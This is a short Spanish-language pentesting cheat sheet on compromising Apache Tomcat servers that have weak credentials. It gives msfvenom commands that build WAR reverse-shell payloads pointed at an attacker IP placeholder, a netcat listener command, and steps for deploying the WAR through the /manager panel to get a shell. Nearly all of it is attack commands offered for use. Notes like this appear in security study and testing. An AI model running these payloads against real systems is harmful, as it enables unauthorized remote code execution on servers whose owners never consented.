# Servidor Tomcat

Apache Tomcat es un servidor web Java. Si tiene credenciales débiles, se puede subir un payload WAR para obtener una shell.

## Generar Payload WAR

Dependiendo de la version de Tomcat puede funcionar uno u otro:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f war -o reverse1.war
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f war -o reverse2.war
```

## Ponerse en Escucha y Desplegar

```bash
nc -nlvp <puerto>
```

Subir el archivo `.war` desde el panel de administracion de Tomcat (normalmente en `/manager`), y al acceder a la ruta del WAR, se ejecuta el payload.
